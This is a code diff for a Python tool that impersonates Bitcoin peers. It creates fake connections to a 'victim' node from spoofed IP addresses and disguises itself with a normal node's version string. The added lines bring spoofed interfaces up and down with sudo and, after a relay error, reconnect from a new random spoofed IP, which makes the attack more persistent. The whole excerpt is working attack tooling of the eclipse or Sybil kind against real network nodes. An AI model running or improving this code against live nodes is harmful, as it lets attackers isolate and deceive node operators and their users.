@@ -44,7 +44,7 @@ def get_interface():
 	if m != None:
 		return m.group(1)
 	else:
-		print('ERROR: Network interface couldn\'t be found.')
+		print('Error: Network interface couldn\'t be found.')
 		sys.exit()
 
 # Get the broadcast address of the network interface
@@ -54,7 +54,7 @@ def get_broadcast_address():
 	if m != None:
 		return m.group(1)
 	else:
-		print('ERROR: Network broadcast IP couldn\'t be found.')
+		print('Error: Network broadcast IP couldn\'t be found.')
 		sys.exit()
 
 # Generate a random identity using the broadcast address
@@ -87,6 +87,18 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	# Default is /python-bitcoinlib:0.11.0/
 	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
 	return msg
+
+# Close a connection
+def close_connection(index):
+	if index not in spoof_IP_sockets:
+		print('Error: Failed to close connection')
+		return
+	spoof_IP_sockets[index].close()
+	terminal(f'sudo ifconfig {spoof_IP_interface[index][0]} {spoof_IP_interface[index][1]} down')
+
+	del spoof_IP_and_ports[index]
+	del spoof_IP_sockets[index]
+	del spoof_IP_interface[index]
 
 # Creates a fake connection to the victim
 def make_fake_connection(src_ip, dst_ip):
@@ -262,8 +274,12 @@ def packet_received(packet):
 					rand_socket.send(bytes(payload))
 
 				except Exception as e:
-					print('Relaying message FAILED')
-					print(e)
+					print("Closing socket because of error:" + str(e))
+					close_connection(rand_i)
+					#make_fake_connection(rand_ip, victim_ip) # Use old IP
+					make_fake_connection(random_ip(), victim_ip)
+					sys.exit()
+
 
 	if msgtype == 'verack':
 		# Successful connection! Move from pending to successful
